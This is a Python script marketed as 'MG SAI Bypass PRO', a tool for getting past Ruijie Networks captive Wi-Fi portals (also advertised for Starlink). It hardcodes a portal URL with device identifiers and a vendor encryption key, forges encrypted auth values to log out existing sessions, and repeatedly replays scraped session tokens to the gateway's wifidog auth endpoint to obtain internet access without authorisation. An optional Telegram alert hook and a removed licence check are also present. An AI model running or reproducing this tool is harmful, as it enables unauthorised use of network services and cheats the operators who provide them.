import os
import re
import sys
import zlib
import time
import ping3
import base64
import random
import string
import urllib
import marshal
import getpass
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
import importlib.util
from datetime import timedelta, datetime
from urllib.parse import unquote, urlparse, parse_qs
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Color codes 
r, g, y, b, w, c = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[0m", "\033[1;36m"

# ==================== [ 🔒 ACCESS CONTROL ] ====================
# ခွင့်ပြုချက်စနစ် ဖယ်ရှားပြီးဖြစ်သည် - အားလုံးဝင်ရောက်ခွင့်ရှိသည်
APPROVED_USERS = {}
# ===============================================================

# ==================== [ CONFIGURATION ] ====================
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b2c5a99&gw_sn=H1TB2WU00735B&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.119&mac=82:fd:df:49:43:57&slot_num=16&nasip=192.168.1.122&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C231&chap_challenge=%5C145%5C221%5C077%5C252%5C366%5C000%5C236%5C077%5C227%5C131%5C330%5C276%5C330%5C236%5C360%5C377"

TELEGRAM_BOT_TOKEN = "" 
TELEGRAM_CHAT_ID = ""
# ===========================================================

LOG_FILE = "bypass_history.txt"
EXP_DATE = "Verifying..."

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def get_device_identity():
    try:
        user = subprocess.check_output("whoami", shell=True).decode().strip()
        return user
    except Exception:
        return "unknown_user"

def Logo():
    clear()
    dev_id = get_device_identity()
    logo = rf"""{c}
 ╔─────────────────────────────────────────────────────────╗
│                                                         │
│      ███╗   ███╗ ██████╗     ███████╗ █████╗ ██╗        │
│      ████╗ ████║██╔════╝     ██╔════╝██╔══██╗██║        │
│      ██╔████╔██║██║  ███╗    ███████╗███████║██║        │
│      ██║╚██╔╝██║██║   ██║    ╚════██║██╔══██║██║        │
│      ██║ ╚═╝ ██║╚██████╔╝    ███████║██║  ██║██║        │
│      ╚═╝     ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝╚═╝        │
│                                                         │
│              ╭─────────────────────────────────╮        │
│              │    M G   S A I  Bypass P R O   V 1    │        │
│              ╰─────────────────────────────────╯        │
│                                                         │
│         ✨  STABLE  •  FAST  •  SECURE  ✨              │
│                                                         │
╚─────────────────────────────────────────────────────────╝

        {w}>> {g}STARLINK & RUIJIE BYPASS PRO {w}<<
  {y}--------------------------------------------------
   {w}👤 ID: {g}{dev_id} {w}| 📅 EXP: {g}{EXP_DATE}
   {w}Status: {g}Premiun Bypass tg link- @MGSai_4402
  {y}--------------------------------------------------{w}"""
    print(logo)

# Access Control Check Logic - ခွင့်ပြုချက်စနစ် ဖြုတ်ထားပြီး အားလုံးအတွက် အလုပ်လုပ်သည်
def check_approval():
    global EXP_DATE
    EXP_DATE = "Unlimited"
    return True

def write_log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {message}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

async def send_telegram_alert(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": f"🚀 [Ruijie Pro Alert]\n{message}"}
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json=payload, timeout=5)
    except:
        pass

def parse_target_url(url_string):
    try:
        parsed_url = urlparse(url_string)
        params = parse_qs(parsed_url.query)
        gw_address = params.get('gw_address', ['192.168.110.1'])[0]
        chap_id = params.get('chap_id', [None])[0]
        chap_challenge = params.get('chap_challenge', [None])[0]
        return gw_address, chap_id, chap_challenge
    except:
        return "192.168.110.1", None, None

class WifiSetup:
    def __init__(self, gw_address, chap_id, chap_challenge):
        self.baseurl = f"http://{gw_address}:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
        self.enc_key = "RjYkhwzx$2018!" 
        self.chap_id = chap_id
        self.chap_challenge = chap_challenge

    def start_setup(self):
        Logo()
        print(f"\n{c}[*] Starting Ruijie Wi-Fi Setup...{w}")
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Warning: Unbind old session failed!{w}")
            write_log("Wi-Fi Setup executed - Unbind old session failed.")
        else:
            print(f"{g}[+] Old session unbinded successfully!{w}")
            write_log("Wi-Fi Setup executed - Old session unbinded successfully.")
            time.sleep(2)
        Line()

    def unbind(self):
        username = self.username_get()
        if not username: return False
        online_info = self.get_online_info(username)
        if not online_info: return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try: return requests.get(self.username_get_url, timeout=5).json().get("username", None)
        except: return None
    
    def get_online_info(self, username):
        params = {"username": username, "usertype": "wifidog"}
        try: return requests.get(self.online_info_url, params=params, timeout=5).json()["data"]["list"][0]
        except: return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        return {"ip": info["ip"], "mac": info["mac"], "ip_req": info["ip"], "mac_req": ".".join(repmac)}

    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        cipher = AES.new(key_iv[:32], AES.MODE_CBC, key_iv[32:48])
        return base64.b64encode(b"Salted__" + salt + cipher.encrypt(pad(auth.encode("utf-8"), AES.block_size))).decode("utf-8")

    def get_auth(self, username):
        if not self.chap_id or not self.chap_challenge: return None
        auth = unquote(self.chap_id) + unquote(self.chap_challenge) + username
        return self.encrypt_cryptojs(auth, self.enc_key)

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth: return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try: return bool(requests.post(self.logout_url, data=payload, timeout=5).json().get("success"))
        except: return False

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, logo/537.36)'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id: return session_id.group(1)
            return False
    except:
        return previous_session_id

class InternetAccess:
    def __init__(self, gw_address):
        Logo()
        self.ip = gw_address
        self.session_url = TARGET_URL
        print(f"\n[+] Active Pro Gateway IP: {self.ip}")
    
    async def main(self):
        await execute(self.session_url, self.ip)

async def get_smart_ping():
    targets = ["google.com", "8.8.8.8", "cloudflare.com"]
    for target in targets:
        ping = await asyncio.to_thread(ping3.ping, target, timeout=2)
        if ping is not None:
            ping_ms = int(ping * 1000)
            if ping_ms >= 100: return f"{r}{ping_ms} ms ({target}){w}"
            elif ping_ms >= 70: return f"{y}{ping_ms} ms ({target}){w}"
            return f"{g}{ping_ms} ms ({target}){w}"
    return f"{r}Offline{w}"

async def execute(session_url, ip):
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=512, ttl_dns_cache=300) 
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        write_log("Internet Bypass service initialized.")
        await send_telegram_alert("Bypass Service Started Successfully! 🚀")
        
        try:
            while True:
                previous_session_id = None
                while True:
                    print(f"{g}[*] Extracting stable session id...{w}")
                    Line()
                    session_id = await get_session_id(session, session_url, previous_session_id)
                    if session_id:
                        previous_session_id = session_id
                        print(f"{g}[+] Valid Session ID Locked: {session_id}{w}")
                        Line()
                        break
                    else:
                        print(f"{y}[!] Target Server Busy. Sleeping for 5s...{w}")
                        Line()
                        await asyncio.sleep(5)

                for i in range(3):
                    send_status = await send(session, ip, session_id)
                    ping = await get_smart_ping()
                    
                    if not send_status:
                        print(f"{r}[!] Connection drop warning! Re-stabilizing...{w}")
                        write_log(f"Warning: Package drop encountered. Ping: {ping}")
                        Line()
                    else:
                        print(f"{g}[+] Internet Bypass Stable{w}")
                        Line()
                    
                    print(f"{b}[*] Network Latency: {ping}{w}")
                    Line()
                    await asyncio.sleep(15)
                
                print(f"{c}[*] Auto-Refreshing Session Layer...{w}")
                write_log("Session Layer refreshed automatically.")
                await send_telegram_alert(f"Session Refreshed! Connection is Stable. Current Ping: {ping}")
                Line()
                await asyncio.sleep(2)
                
        except KeyboardInterrupt:
            write_log("Process stopped by User.")
            sys.exit(0)
        except Exception as e:
            write_log(f"Process crashed with error: {e}")
            sys.exit(0)
    
async def send(session, ip, session_id):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {'token': session_id, 'phoneNumber': 'HELLO WORLD'}
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "http://www.baidu.com" in response or "portal-as.ruijienetworks.com" in response or "success.html" in response:
                return True
            return False
    except:
        return False

def show_menu():
    print(f"""{c}
  ┌───────────────────────────────────────┐
  │      WAYMAKER ULTRA-PRO STABLE        │
  ├───────────────────────────────────────┤
  │  {w}[1] {g}⚙️  Wi-Fi Setup                   {c}│
  │  {w}[2] {g}🚀  Internet Bypass (Direct)       {c}│
  │  {w}[3] {r}❌  Logout                         {c}│
  └───────────────────────────────────────┘{w}""")

async def main():
    check_approval()  # ခွင့်ပြုချက်စနစ် ဖြုတ်ထားပြီး အမြဲတမ်း True ပြန်သည်
    gw_address, chap_id, chap_challenge = parse_target_url(TARGET_URL)
    while True:
        Logo()
        show_menu()
        choice = input(f"  {y}Choose Menu >>> {w}").strip()
        if choice == '1':
            setup = WifiSetup(gw_address, chap_id, chap_challenge)
            setup.start_setup()
            input(f"\n{y}Press Enter to return to menu...{w}")
        elif choice == '2':
            access = InternetAccess(gw_address)
            await access.main()
            break 
        elif choice == '3':
            write_log("User logged out manually.")
            sys.exit(0)

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: sys.exit(0)